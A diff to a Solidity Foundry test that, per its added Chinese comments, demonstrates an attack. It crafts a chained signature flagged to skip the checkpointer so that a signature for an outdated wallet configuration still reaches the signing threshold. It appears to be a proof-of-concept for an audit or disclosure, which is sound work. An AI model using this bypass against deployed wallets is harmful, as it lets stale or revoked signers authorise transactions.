@@ -10,8 +10,6 @@ import { PrimitivesRPC } from "../utils/PrimitivesRPC.sol";
 import { AdvTest } from "../utils/TestUtils.sol";
 import { Vm } from "forge-std/Test.sol";
 
-import { console } from "forge-std/console.sol";
-
 contract BaseSigImp {
 
   function recoverPub(
@@ -2567,12 +2565,12 @@ contract BaseSigTest is AdvTest {
     uint256 checkpoint1 = 1;
     uint256 checkpoint2 = 2;
 
-    string memory url = string.concat(
-      vm.envString("SEQ_SDK_RPC_URL_PREFIX"),
-      vm.toString(vm.envUint("SEQ_SDK_RPC_MIN_PORT")),
-      vm.envString("SEQ_SDK_RPC_URL_SUFFIX")
-    );
-    console.log(url);
+    // string memory url = string.concat(
+    //   vm.envString("SEQ_SDK_RPC_URL_PREFIX"),
+    //   vm.toString(vm.envUint("SEQ_SDK_RPC_MIN_PORT")),
+    //   vm.envString("SEQ_SDK_RPC_URL_SUFFIX")
+    // );
+    // console.log(url);
 
     // Let's assume config1 is currently where the wallet contract is at, while the checkpointer is ahead at config2
     string memory config1 = PrimitivesRPC.newConfigWithCheckpointer(
@@ -2582,24 +2580,28 @@ contract BaseSigTest is AdvTest {
     string memory config2 = PrimitivesRPC.newConfigWithCheckpointer(
       vm, checkpointer, 1, checkpoint2, string(abi.encodePacked("signer:", vm.toString(bob), ":2"))
     );
-
+    // 准备要签名的交易
     Payload.Decoded memory finalPayload;
     finalPayload.kind = Payload.KIND_TRANSACTIONS;
-
-    Snapshot memory latestSnapshot = Snapshot(PrimitivesRPC.getImageHash(vm, config2), 2);
+    // 模拟检查点返回最新快照
+    Snapshot memory latestSnapshot = Snapshot(
+      PrimitivesRPC.getImageHash(vm, config2), // 最新配置的哈希
+      2 // 最新检查点
+    );
 
     bytes memory chainedSignature;
     {
+      // Alice 用她的私钥签名
       (uint8 v, bytes32 r, bytes32 s) = vm.sign(aliceKey, Payload.hashFor(finalPayload, address(baseSigImp)));
 
       // One and only signature within the chain which is valid for config1 (currently out of date)
       bytes memory signature = PrimitivesRPC.toEncodedSignature(
         vm,
-        config1,
+        config1, //使用就配置
         string(
           abi.encodePacked(vm.toString(alice), ":hash:", vm.toString(r), ":", vm.toString(s), ":", vm.toString(v))
         ),
-        true
+        true // includeCheckpointer = true
       );
 
       // Remove checkpointer data from the signature
@@ -2613,22 +2615,39 @@ contract BaseSigTest is AdvTest {
       }
 
       // Construct the chained signature
+      // 外层标志：链式签名但不使用检查点器
       bytes1 outerFlag = bytes1(uint8(0x5)); // 0b000 001 01 => no checkpointer usage
+      //                                          │││ │││ │└─ bit 0 = 1: 链式签名 ✓
+      //                                          │││ │││ └── bit 1 = 0
+      //                                          │││ ││└───  bit 2 = 1
+      //                                          │││ └ ────── ...
+      //                                          ││└──────── bit 6 = 0: 不使用检查点器
+      // 内层签名大小（3字节，uint24）
+
+      //组装链式签名
       uint24 innerSigSize = uint24(adjustedSignature.length);
       chainedSignature = new bytes(adjustedSignature.length + 4);
-      chainedSignature[0] = outerFlag;
-      chainedSignature[1] = bytes1(uint8(innerSigSize >> 16));
-      chainedSignature[2] = bytes1(uint8(innerSigSize >> 8));
-      chainedSignature[3] = bytes1(uint8(innerSigSize));
+      chainedSignature[0] = outerFlag; // 1 字节：标志
+      chainedSignature[1] = bytes1(uint8(innerSigSize >> 16)); // 高字节
+      chainedSignature[2] = bytes1(uint8(innerSigSize >> 8)); // 中字节
+      chainedSignature[3] = bytes1(uint8(innerSigSize)); // 低字节
+      //复制内层签名
       for (uint256 i = 4; i < chainedSignature.length; i++) {
         chainedSignature[i] = adjustedSignature[i - 4];
       }
     }
+    // Mock 检查点器返回最新快照
+    vm.mockCall(checkpointer, abi.encodeWithSelector(ICheckpointer.snapshotFor.selector), abi.encode(latestSnapshot)); // 返回 config2 的快照
 
-    vm.mockCall(checkpointer, abi.encodeWithSelector(ICheckpointer.snapshotFor.selector), abi.encode(latestSnapshot));
+    // 尝试恢复签名
+    (uint256 threshold, uint256 weight, bytes32 imageHash,,) = baseSigImp.recoverPub(
+      finalPayload,
+      chainedSignature,
+      false, // ignoreCheckpointer = false
+      address(0) //  初始 checkpointer 为零
+    );
 
-    (uint256 threshold, uint256 weight, bytes32 imageHash,,) =
-      baseSigImp.recoverPub(finalPayload, chainedSignature, false, address(0));
+    // 验证攻击成功
     assertGe(weight, threshold, "Weight must at least reach threshold");
     assertEq(imageHash, PrimitivesRPC.getImageHash(vm, config1), "Must have correct image hash");
   }
